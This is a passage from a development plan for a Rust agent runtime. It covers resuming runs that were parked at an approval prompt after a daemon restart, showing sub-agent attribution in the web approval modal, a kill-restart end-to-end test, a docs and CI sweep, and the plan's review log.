`wire_parked_session` — re-derive displays via a resume-built loop, register
externals, race the answers:

```rust
    fn wire_parked_session(self: Arc<Self>, parked: crate::resume::ParkedSession, key: [u8; 32]) {
        let Some(root_chk) = parked.root.clone() else {
            self.emit_error(format!(
                "session {}: parked tree has no root checkpoint; cannot resume",
                parked.descriptor.session_id
            ));
            return;
        };
        // One assembled loop serves BOTH display re-derivation and the
        // actual resume — built against the descriptor workspace + current
        // config (spec §3.3).
        let artifacts = Arc::new(agent_core::SessionArtifacts::new());
        let todos: agent_core::TodoHandle = Arc::new(Mutex::new(Vec::new()));
        let flag = Arc::new(std::sync::atomic::AtomicBool::new(false));
        let ck = agent_core::Checkpointer::new(
            parked.root_dir.clone(), key, parked.descriptor.session_id.clone());
        let built = self.runtime.build_resume_loop(
            &parked.descriptor.workspace, ck, &artifacts, &todos, &flag);
        let sid = parked.descriptor.session_id.clone();
        for ask in parked.asks {
            if ask.answered {
                // crash-after-commit window: resume directly, no re-prompt
                self.clone().start_resume(&sid, built.loop_.clone(),
                    built.system_prompt.clone(), root_chk.clone(),
                    artifacts.clone(), todos.clone(), flag.clone(), key,
                    parked.root_dir.clone());
                continue;
            }
            let idx = ask.checkpoint.parked.parked_index.expect("gate-kind");
            let call = &ask.checkpoint.parked.tool_calls[idx];
            // Display integrity (spec §2.4 step 4 / §3.4): re-derive from
            // stored args via tool.intent; NEVER emit persisted text.
            let Some(intent) = built.loop_.derive_intent(&call.name, &call.args) else {
                self.emit_error(format!(
                    "session {sid}: parked tool {} unavailable under current config; \
                     answer it after restoring the tool or start a new run",
                    call.name
                ));
                continue;
            };
            let (_, rx) = self.approval.register_external(&sid, crate::approval::ExternalAsk {
                summary: intent.summary.clone(),
                command: intent.command.clone(),
                display: None,
                origin: ask.origin.as_ref().map(|o| crate::wire::ApprovalOriginDto {
                    delegation_id: o.delegation_id.clone(),
                    subagent: o.subagent_name.clone(),
                    depth: o.depth,
                }),
            });
            let sess = self.clone();
            let (loop_, sp) = (built.loop_.clone(), built.system_prompt.clone());
            let (arts, tds, flg, rc, rd) = (artifacts.clone(), todos.clone(),
                flag.clone(), root_chk.clone(), parked.root_dir.clone());
            let sid2 = sid.clone();
            let ask_dir = ask.dir.clone();
            tokio::spawn(async move {
                let Ok(resp) = rx.await else { return };
                let approve = matches!(resp,
                    agent_policy::ApprovalResponse::Approve
                        | agent_policy::ApprovalResponse::ApproveAlways);
                // Durable answer commit (header note 3). E2: ApproveAlways
                // is committed as a plain one-shot approve.
                if let Err(e) = checkpoint::write_answer(&ask_dir, &key, approve) {
                    sess.emit_error(format!("cannot commit answer: {e}"));
                    return;
                }
                sess.start_resume(&sid2, loop_, sp, rc, arts, tds, flg, key, rd);
            });
        }
    }
```

`derive_intent` is a 4-line addition to `AgentLoop` (agent-core, fold into
this task's commit):

```rust
    /// Re-derive a tool's intent from stored args (resume display path —
    /// spec §3.4: what the human sees is never a trusted stored string).
    pub fn derive_intent(&self, name: &str, args: &serde_json::Value) -> Option<agent_policy::ToolIntent> {
        self.tools.get(name)?.intent(args).ok()
    }
```

`start_resume` — busy-guarded, once per session:

```rust
    #[allow(clippy::too_many_arguments)]
    fn start_resume(
        self: Arc<Self>,
        sid: &str,
        loop_: Arc<agent_core::AgentLoop>,
        system_prompt: String,
        root_chk: agent_core::Checkpoint,
        artifacts: Arc<agent_core::SessionArtifacts>,
        todos: agent_core::TodoHandle,
        flag: Arc<std::sync::atomic::AtomicBool>,
        key: [u8; 32],
        root_dir: PathBuf,
    ) {
        if !self.resuming.lock().unwrap().insert(sid.to_string()) {
            return; // first answer already driving this tree
        }
        {
            let mut active = self.active.lock().unwrap();
            if active.is_some() {
                self.emit_error(format!(
                    "session {sid} answered but a run is active; reattach after it finishes"
                ));
                self.resuming.lock().unwrap().remove(sid);
                return;
            }
            *active = Some(CancellationToken::new());
        }
        let cancel = self.active.lock().unwrap().as_ref().unwrap().clone();
        let sess = self;
        let sid = sid.to_string();
        // First answer wins for THIS tree: retract our other re-emitted
        // externals so a stale prompt cannot mint a second resume or an
        // orphaned answer.json (plan review finding 12). The resumed tree
        // re-asks any still-parked child live under a fresh id.
        self.approval.retract_external_for(&sid);
        tokio::spawn(async move {
            if let Ok(dump) = checkpoint::load_artifact_dump(&root_dir, &key) {
                agent_core::checkpoint::restore_artifacts(&artifacts, &dump).await;
            }
            let root_answer = checkpoint::take_answer(&root_dir, &key);
            let mut ctx = agent_core::CuratedContext::restore(
                agent_model::Message::system(system_prompt),
                artifacts,
                flag,
                todos,
                root_chk.context.clone(),
            );
            let resume = root_chk.resume_turn(root_answer);
            match loop_.resume_with_cancel(&mut ctx, resume, cancel).await {
                Ok(()) => {
                    // Completed tree: delete-on-completion (spec §2.3;
                    // parked children were consumed en route).
                    let _ = std::fs::remove_dir_all(&root_dir);
                }
                Err(e) => {
                    // Spec §4: surface as a normal run error on the attached
                    // frontend; the PARK IS RETAINED so a later attach can
                    // retry (plan review BLOCKER 1b — never destroy the
                    // checkpoint on a failed resume).
                    sess.emit_error(format!("resumed run failed: {e}"));
                }
            }
            *sess.active.lock().unwrap() = None;
        });
    }
```

Key-sourcing note for the session-level test: `load_or_create_secret` reads
`metadata_root()` = `$HOME/.rusty-agent` — in tests, set a scoped `HOME`
override the way agent-server's existing HOME-sensitive tests do (check for
a `temp_env`/serial pattern; if none exists, mark the test `#[serial]` via
the existing dev-dep or guard on `std::env::var("HOME")` redirection with
`std::env::set_var` + `serial_test` — mirror whatever trace tests already
do; **do not** write to the real `$HOME`).

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd agent && cargo test -p agent-server`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add agent/crates/agent-server agent/crates/agent-core/src/loop_.rs
git commit -m "feat(server): attach-to-resume — parked scan, re-derived re-emit, durable answer, tree resume (4B-1)"
```

---

### Task 13: Web — modal attribution + SubagentCard `waiting-approval`

**Files:**
- Modify: `web/src/wire.ts`, `web/src/socket.ts`, `web/src/state.ts`,
  `web/src/components/ApprovalPrompt.tsx`,
  `web/src/components/AnimatedToolCall.tsx`
- Test: `web/src/state.approval.test.ts` (new; style of
  `state.subagent.test.ts`)

**Interfaces:**
- Consumes: Task 10's wire shape.
- Produces: minimal 4B-1 UX (full parked-run UX is 4B-2).

- [ ] **Step 1: Write the failing tests**

`web/src/state.approval.test.ts`:

```ts
import { describe, expect, it } from "vitest";
import { initialState, reduce } from "./state";
import type { Inbound } from "./wire";

const frame = (payload: unknown): Inbound =>
  ({ v: 1, session_id: "s", kind: "event", payload } as Inbound);
const red = (s: ReturnType<typeof initialState>, p: unknown) =>
  reduce(s, { type: "frame", frame: frame(p) });

describe("approval attribution + waiting-approval card state", () => {
  const approvalFrame: Inbound = {
    v: 1, session_id: "s", id: "c9", kind: "approval_request",
    summary: "run: echo hi",
    origin: { delegation_id: "c1", subagent: "explore", depth: 1 },
  } as Inbound;

  it("stores origin on pendingApproval", () => {
    let s = initialState([]);
    s = reduce(s, { type: "frame", frame: approvalFrame });
    expect(s.pendingApproval?.origin?.subagent).toBe("explore");
  });

  it("marks the dispatch card waiting-approval and clears on answer", () => {
    let s = initialState([]);
    s = red(s, { type: "tool_start", id: "c1", name: "dispatch_agent", args: {} });
    s = red(s, { type: "subagent_start", id: "c1", subagent_type: "explore" });
    s = reduce(s, { type: "frame", frame: approvalFrame });
    const card = () =>
      (s.items.find((i) => i.kind === "tool" && i.id === "c1") as any).subagent;
    expect(card().waitingApproval).toBe(true);
    s = reduce(s, { type: "approval_sent" });
    expect(card().waitingApproval).toBe(false);
    expect(s.pendingApproval).toBeNull();
  });

  it("subagent_end also clears waiting-approval", () => {
    let s = initialState([]);
    s = red(s, { type: "tool_start", id: "c1", name: "dispatch_agent", args: {} });
    s = red(s, { type: "subagent_start", id: "c1", subagent_type: "explore" });
    s = reduce(s, { type: "frame", frame: approvalFrame });
    s = red(s, { type: "subagent_end", id: "c1", outcome: "completed" });
    const card = (s.items.find((i) => i.kind === "tool" && i.id === "c1") as any).subagent;
    expect(card.waitingApproval).toBe(false);
  });

  it("parent approval (no origin) touches no card", () => {
    let s = initialState([]);
    s = reduce(s, { type: "frame", frame: {
      v: 1, session_id: "s", id: "c9", kind: "approval_request", summary: "run: rm x",
    } as Inbound });
    expect(s.pendingApproval?.origin).toBeUndefined();
  });
});
```

(Adapt the item-lookup helper to state.ts's real `Item`/`ToolItem` types —
`findLiveCardIndex` exists; match `state.subagent.test.ts`'s accessors
instead of `as any` where practical.)

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd web && npx vitest run src/state.approval.test.ts`
Expected: FAIL (origin/waitingApproval absent).

- [ ] **Step 3: Implement**

`wire.ts`:
- approval_request inbound frame (locate by content) gains
  `origin?: ApprovalOrigin` with

```ts
export interface ApprovalOrigin {
  delegation_id: string;
  subagent: string;
  depth: number;
}
```

`socket.ts` `toInbound`: pass `origin: ev.origin` through (next to
`display`).

`state.ts`:
- `PendingApproval` gains `origin?: ApprovalOrigin;`
- `SubagentCard` gains `waitingApproval?: boolean;`
- approval_request frame handler (locate
  `if (frame.kind === "approval_request")`) becomes:

```ts
  if (frame.kind === "approval_request") {
    let items = state.items;
    if (frame.origin) {
      items = [...items];
      const i = findLiveCardIndex(items, frame.origin.delegation_id);
      const it = i >= 0 ? items[i] : undefined;
      if (it && isToolItem(it) && it.subagent) {
        items[i] = { ...it, subagent: { ...it.subagent, waitingApproval: true } };
      }
    }
    return { ...state, items, pendingApproval: {
      id: frame.id, summary: frame.summary, command: frame.command,
      display: frame.display, origin: frame.origin } };
  }
```

- `approval_sent` clears every card's flag (single pending slot ⇒ sweep):

```ts
    case "approval_sent":
      return {
        ...state,
        pendingApproval: null,
        items: state.items.map((it) =>
          isToolItem(it) && it.subagent?.waitingApproval
            ? { ...it, subagent: { ...it.subagent, waitingApproval: false } }
            : it,
        ),
      };
```

- `subagent_end` handler: add `waitingApproval: false` into the card spread.

`ApprovalPrompt.tsx`: above the summary line (locate `{approval.summary}`):

```tsx
      {approval.origin && (
        <div className="approval-origin">
          Sub-agent <b>{approval.origin.subagent}</b>
          {approval.origin.depth > 1 ? ` (depth ${approval.origin.depth})` : ""} wants to run:
        </div>
      )}
```

(match the component's existing styling idiom — inline style vars like the
rest of the file if it doesn't use classNames.)

`AnimatedToolCall.tsx`: in the status indicator (locate the
`item.subagent.status === "running"` color ternary), waiting wins while
running:

```tsx
const waiting = item.subagent.status === "running" && item.subagent.waitingApproval;
// color: waiting ? "var(--cli-accent)" : <existing ternary>
// status text: waiting ? "waiting approval" : <existing "running"/outcome>
```

(Verified: the CSS vars are `accent/bg/border/dim/err/ok/text` — there is no
warn/amber var, so `--cli-accent` + the "waiting approval" LABEL carry the
state; the label is the load-bearing part.)

- [ ] **Step 4: Run web checks**

Run: `cd web && npx tsc --noEmit && npx vitest run`
Expected: typecheck clean; all vitest suites PASS (the pre-existing approval
reducer tests live in the legacy `web/test/state.test.ts` — they stay green
because the new fields are additive).

- [ ] **Step 5: Commit**

```bash
git add web/src
git commit -m "feat(web): approval attribution + SubagentCard waiting-approval state (4B-1)"
```

---

### Task 14: Live kill-restart WebDriver drive

**Files:**
- Modify: the `gui_smoke` suite under the location
  `.agents/skills/auto-drive-tauri` documents (locate the existing suite by
  content; 3B-2's live drive is the precedent) — add one scenario.
- Test: this IS the test.

**Preconditions:** local model serving (memory: llama.cpp on :8080, docker
container `llama-agent`), `tauri-driver` + WebDriver deps per the skill.
**Read `.agents/skills/auto-drive-tauri/SKILL.md` first** — it owns the
bring-up mechanics, the one-session wedge gotcha, and the webkit
version-match gotcha.

- [ ] **Step 1: Scenario (spec §6, E6a: depth-1)**

Script, following the suite's existing step idiom:

1. Launch the app with a config whose command allowlist is EMPTY (every
   `execute_command` Asks) and subagents enabled; workspace = a tempdir.
2. Send a prompt engineered to dispatch a child that runs a shell command
   (the 3B-2 drive has a working dispatch prompt — reuse it, appending
   "then run `echo resumed-ok` with the shell").
3. Wait for the approval modal; assert it renders the sub-agent attribution
   ("Sub-agent … wants to run"). Do NOT answer.
4. Assert on disk: `~/.rusty-agent/sessions/<id>/checkpoint/children/*/parked.json`
   exists.
5. Kill the daemon hard (`pkill -9` the app process; record its pid first).
6. Relaunch (assert a **genuinely new pid**). Attach (app auto-subscribes).
7. Assert the attributed modal re-appears (re-emitted from disk) and its
   command text matches the real parked command (re-derived display).
8. Approve. Assert the run completes: the child result lands, the final
   assistant text arrives, and the checkpoint dir is gone.

- [ ] **Step 2: Run it**

Per the skill's runner command (locate in SKILL.md). Expected: scenario
green. Capture the transcript/screenshots the suite normally saves.

- [ ] **Step 3: Commit**

```bash
git add <suite files>
git commit -m "test(e2e): live kill-restart resume drive — child ask, new pid, attributed approve (4B-1)"
```

---

### Task 15: Sweep, full CI, branch finish

**Files:**
- Modify: `agent/config.example.toml` (E5 knob),
  `agent/AGENTS.md` (sessions bullet gains the checkpoint dir),
  `AGENTS.md` (root — only if it states approval-timeout semantics; check)
- Test: full CI

- [ ] **Step 1: Docs sweep (spec §2.8, the 4B-1-relevant rows)**

- `agent/config.example.toml`: add under the approval/policy section:

```toml
# Auto-deny an unanswered approval after N seconds (headless/eval callers).
# Unset (default): an unanswered approval parks durably — the run survives
# frontend disconnect and daemon restart, and resumes when answered.
# approval_auto_deny_secs = 300
```

- `agent/AGENTS.md` sessions bullet (extend the 4B-0 text): parked runs
  write `~/.rusty-agent/sessions/<id>/checkpoint/` (HMAC'd `parked.json`,
  deleted when the approval is answered); `~/.rusty-agent/secret` keys the
  MAC.
- Grep for stale prose:
  `grep -rn "300s\|auto-deny\|APPROVAL_TIMEOUT" agent docs web --include=*.md --include=*.rs --include=*.toml`
  — update whatever states the old server timeout as current behavior.
  (Bundle gap-analysis rows are a named §5 follow-on — do NOT edit
  `docs/okf/deepagents-refactor/` this cycle.)

- [ ] **Step 2: Full CI**

Run: `cd /home/kalen/rust-agent-runtime && bash scripts/ci.sh`
Expected: ALL legs green (okf check, skills lint, fmt, clippy, cargo test
agent/, conditional src-tauri, web typecheck/vitest). Commit any fmt
rewrites separately (`style: cargo fmt` — but hand-verify src-tauri is NOT
cargo-fmt'd per repo gotcha; ci.sh knows).

- [ ] **Step 3: Commit + whole-branch review + merge**

```bash
git add agent/config.example.toml agent/AGENTS.md
git commit -m "docs: E5 approval-park knob + checkpoint layout (4B-1 sweep)"
```

Per repo SDLC: whole-branch review, then merge `--no-ff` to main, branch
deleted, merged-tree hash verified identical to the green branch tip.
(Use superpowers:finishing-a-development-branch.)

---

## Self-review notes (author, 2026-07-10)

**Spec coverage (slice 4B-1 items, spec §0):**
- `checkpoint.rs` versioned serde / park write / HMAC manifest / atomic
  temp+rename / refuse-on-corrupt ✅ T4–T5.
- `Message` serde ✅ T1. `CuratedContext` restore seam, full pinned state ✅
  T3 (goal, history, summary, ledger+sections, seq, flags, todos; system/
  memory-index/offload-config re-derive live per §3.3).
- Park inside the Phase-1 gate loop ✅ T6–T7; auto-deny removal + E5 knob ✅
  T10; park-deletion answer commit ✅ T7 (live) + T12 (durable answer.json,
  header note 3).
- Resume: startup parked index ✅ T12 `scan_parked` (wires 4B-0's
  `scan_descriptors` — the ratified 4B-0 narrowing lands here); attach
  re-emit ✅ T10 (daemon-alive) + T12 (restart); re-derived display ✅ T12
  (`derive_intent`, mismatched-stored-display pin); gate re-entry at parked
  index ✅ T8.
- SessionArtifacts dump/restore, Backend-trait-level, recursive ls ✅ T5.
- Child tree + rebinding ✅ T9; attribution via wrap-at-dispatch channel ✅
  T2+T9; wire origin fields ✅ T10.
- Desktop/web modal attribution + waiting-approval card ✅ T13.
- Tests incl. live kill-restart new-pid drive ✅ T7/T8/T9/T12 units +
  reducer tests T13 + T14 drive. Full CI per slice ✅ T15.

**Invariant mapping (spec §3):** §3.1 E1 pins (T7 zero-I/O test, T11
no-dir-at-construction); §3.2 policy engine untouched (park wraps `check()`
outcomes only); §3.3 build_resume_loop uses current config (T11 test); §3.4
derive_intent + never-emit-stored-display (T12 test); §3.5 additive frames
(T10); §3.6 trace untouched (no trace edits anywhere); §3.7
mutation-verified no-re-prompt splice (T8 asks==0 pins); §3.8 tally seed +
floor clamp (T8); §3.9 children rebuilt through the same dispatch path (T9
— registry floors/allowlists/ResponseCapture all sit in the unchanged
child-assembly code the resume arm shares); §3.10 memory untouched
(memory_index deliberately not checkpointed; run_start hooks re-load it).

**Known escalations for plan review** (also in header notes): sibling
re-execution on dispatch-kind resume (note 4); answer.json commit mechanism
(note 3); children keyed by call id (note 1).

**Type-consistency check:** `GateRecord`/`Guardrails`/`InvalidParked`
spelled identically in T4 (defs), T6–T8 (loop), T9 (dispatch), T12
(coordinator). `Checkpointer::new/child/write_park/clear_park/end_turn/
load_child/load_child_answer/clear_all` defined T5/T9, consumed T7/T9/T11/
T12. `ResumeTurn`/`resume_turn(decision)` defined T8, consumed T9/T12.
`register_external`/`reemit_pending`/`ExternalAsk` defined T10, consumed
T12. `LoopParts.checkpoint`/`DispatchDeps.checkpoint` T9/T11.
`ApprovalOriginDto{delegation_id, subagent, depth}` T10, consumed T12/T13;
policy-side `ApprovalOrigin{delegation_id, subagent_name, depth}` T2,
consumed T5/T9/T12 — the name difference (`subagent` on the wire,
`subagent_name` in policy) is intentional and mapped at the two conversion
sites (T10 request(), T12 wire_parked_session).

**Deliberately NOT in this slice (spec):** deny-feedback + `Copy`-loss
fan-out, `parked_runs`/`approval_resolved`/`resumed` frames, web parked
banner, CLI session list/reopen/park-timeout — all 4B-2. ApproveAlways
grant store (E2), retention/GC beyond delete-on-completion — §5 deferrals.

## Panel & review log

- **2026-07-10 — plan review** (single skeptical reviewer per SDLC; anchors
  verified against live main @ a3818da): **APPROVE-WITH-FIXES** — 1 blocker,
  6 majors, 11 minors.
  **Blockers/majors FIXED IN PLACE:** consume-time park deletion was
  unimplemented + failed-resume destroyed the park (B1 → gate-kind clears at
  decision-consume, dispatch-kind clears at resumed-batch entry,
  `start_resume` retains on `Err` and surfaces the error; header note 3
  extended); `end_turn` skipped on `TurnFlow::End` exits leaking phantom
  dispatch-kind parks (M2 → shared tail in `tool_phase` + leak test);
  `PartialEq` derive chain didn't compile (M4 → Task 1 also derives
  `PartialEq` on `Message` + `ToolCall`); Task-7 park rigs used
  `WindowContext` whose `checkpoint_state()` is None (M5 → `CuratedContext`
  rigs); two uncovered spec §6 rows (M6 → grandchild-composition unit test
  in Task 5, two-children-parked scan test in Task 12); plus the
  `request()` drop-safety guard, external-prompt retraction on resume start
  (`retract_external_for`), and all minors (pub mod checkpoint, Task-9 load
  ordering + pre-Start error idiom, `assistant_text` populated end-to-end,
  E1 wording, mismatched-display test rewritten to derive-equality,
  tokio test-util / serial_test / HOME-isolation notes, commit staging,
  legacy web test location, `--cli-accent`).
  **ESCALATED TO THE GATE — both DECIDED by owner 2026-07-10, decisions
  folded into Tasks 5/7/8/9:**
  - **P1 (header note 4):** dispatch-kind resume re-executes non-dispatch
    siblings whose side effects already landed pre-crash. Reviewer corrected
    the plan's original rationale (completed siblings' HOST effects do
    persist across the crash). **Decision: SYNTHETIC LOST-RESULT** — only
    dispatch calls re-execute; other Ready siblings yield a
    "result lost across daemon restart" error result (Task 8 splice arm +
    P1 pin test).
  - **P2 (header note 7):** the parent's `subagent_timeout` bounded a parked
    child's ask on the live path — "survives frontend disconnect" would fail
    for children after 600s with the daemon alive. **Decision: DISARM WHILE
    PARKED** — an ancestor-propagated `waiting_asks` counter on
    `Checkpointer` (RAII `AskGuard`, Task 5) is set around the gate await
    (Task 7); the dispatch deadline re-arms instead of firing while it is
    non-zero (Task 9 + P2 pin test); live-only asks keep the hard deadline.
  **MINORS ACCEPTED AS RESIDUAL:** attach-time (not startup-time) parked
  scan recorded as a deliberate reading (header note 8); stale prompts on
  OTHER frontends persist until 4B-2's `approval_resolved` retraction frame;
  empty checkpoint-dir skeletons may linger after live-answer cleanup
  (harmless; pruning ignores them).

- **2026-07-10 — whole-branch merge review (fable, ce75d41..dff7c8d, 20
  commits): READY-TO-MERGE = Yes.** All six cross-task seams verified at the
  live tip (park→resume shape parity incl. dispatch-kind ancestor flow;
  key/path arithmetic; answer-commit chain with no double-execute/re-prompt
  path; E1 write-sweep; P2 counter seam incl. the T14 fix; child quarantine)
  and all ten §3 invariants HELD. Fix wave applied post-review: I1
  resume-guard bounce now surfaces an error + in-resume sessions are not
  re-prompted; I3 torn-window comment; I4 P1 string unify; T12 dead binding.
  **Dispositions recorded at the merge gate:**
  - **NAMED 4B-2 DEFERRAL (T11/M1 — resumed-run trace attribution):**
    `build_resume_loop` shares the resuming daemon's trace handle, so a
    resumed (prior) session's events land in the CURRENT session's trace
    file. §3.6's contract (naming/shape/0o600) is untouched and no events
    are lost — they are misattributed. Proper fix (per-descriptor
    TraceWriter on resume) belongs with 4B-2's session-reopen surface.
  - **E1 NARROWED READING (I2):** on checkpointer-wired dispatch-bearing
    turns, each dispatch call performs one `parked.json` stat (rebind
    lookup) and one `remove_dir_all` attempt on completion (delete-on-
    completion reap) — metadata syscalls, never writes, never dir creation.
    Functionally required by the rebind design; "zero checkpoint I/O"
    remains exact for the write path and for all non-dispatch turns.
  - Live kill-restart drive (T14): PASSED end-to-end on a genuinely new
    pid after the drive first caught and forced the fix of a real
    abort-on-attach product bug (sync `subscribe` + reactor-less spawn) —
    the exact class unit tests structurally miss.

